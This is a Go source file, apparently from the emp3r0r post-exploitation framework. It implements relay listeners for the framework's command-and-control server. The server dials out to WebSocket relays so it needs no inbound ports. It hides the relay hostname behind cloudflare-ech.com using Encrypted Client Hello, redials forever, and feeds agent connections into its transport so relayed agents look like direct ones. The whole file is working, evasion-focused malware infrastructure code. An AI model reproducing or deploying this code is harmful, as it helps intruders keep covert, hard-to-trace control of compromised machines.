// Package server — relay_listener_cc.go
//
// CC-side rendezvous relay support: when cdn_proxy (or a new config field)
// points at a worker_ws relay URL with role=cc, the CC dials OUT to the
// relay and serves agents through it — zero inbound ports required.
//
// Config: emp3r0r.json → "relay_urls": ["wss://host/ws/<room>?role=cc&secret=...", ...]
// Multiple URLs = multi-homed CC (one goroutine per relay, isolation per account).
package server

import (
	"context"
	"net/url"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// StartRelayListeners launches one virtual listener per relay URL.
// Each accepted virtual conn is fed into the same CBOR stream pipeline
// as the raw TLS server, so agents connecting through relays are
// indistinguishable from direct ones at the protocol layer.
// relayDoHURL builds the Worker /dns DoH endpoint from a relay WS URL.
func relayDoHURL(relayWS string) string {
	u, err := url.Parse(relayWS)
	if err != nil || u.Host == "" {
		return ""
	}
	secret := u.Query().Get("secret")
	if secret == "" {
		return ""
	}
	return "https://" + u.Host + "/dns?secret=" + url.QueryEscape(secret)
}

func StartRelayListeners(ctx context.Context, relayURLs []string) {
	// Arm ECH for the CC's own outbound relay connections: fetch each
	// relay host's ECHConfigList (HTTPS RR) via the relay Worker's /dns
	// route, so the CC's long-lived WSS tunnels also mask the relay
	// hostname behind cloudflare-ech.com. Best effort — plain SNI if the
	// zone publishes no ECH config.
	for _, u := range relayURLs {
		if host := transport.HostOfURL(u); host != "" {
			if doh := relayDoHURL(u); doh != "" {
				go transport.RefreshECHConfig(doh, host)
			}
		}
	}
	for _, u := range relayURLs {
		go func(url string) {
			// redial forever with backoff: the first dial can race DNS
			// propagation for a freshly migrated domain
			backoff := 2 * time.Second
			for {
				l, err := transport.NewRelayListener(url)
				if err != nil {
					logging.Errorf("relay listener %s: %v (retrying in %s)", maskSecret(url), err, backoff)
					select {
					case <-ctx.Done():
						return
					case <-time.After(backoff):
					}
					if backoff < 60*time.Second {
						backoff *= 2
					}
					continue
				}
				backoff = 2 * time.Second
				logging.Successf("🔗 Relay tunnel established: %s", maskSecret(url))
				go func() {
					<-ctx.Done()
					_ = l.Close()
				}()
				serveRelayListener(l)
				return
			}
		}(u)
	}
}

// serveRelayListener accepts virtual conns from a relay and hands them to
// the standard CBOR transport pipeline.
func serveRelayListener(l *transport.RelayListener) {
	for {
		conn, err := l.Accept()
		if err != nil {
			logging.Warningf("relay listener closed: %v", err)
			return
		}
		go func(c interface{ Read([]byte) (int, error); Write([]byte) (int, error); Close() error }) {
			stream := transport.NewStreamTransport(c, "relay")
			cborStreamAccept(stream)
		}(conn)
	}
}

// maskSecret hides the secret query parameter in logs.
func maskSecret(url string) string {
	// best-effort: cut at '&secret='
	for i := 0; i+8 <= len(url); i++ {
		if url[i:i+8] == "&secret=" {
			return url[:i+8] + "***"
		}
	}
	return url
}
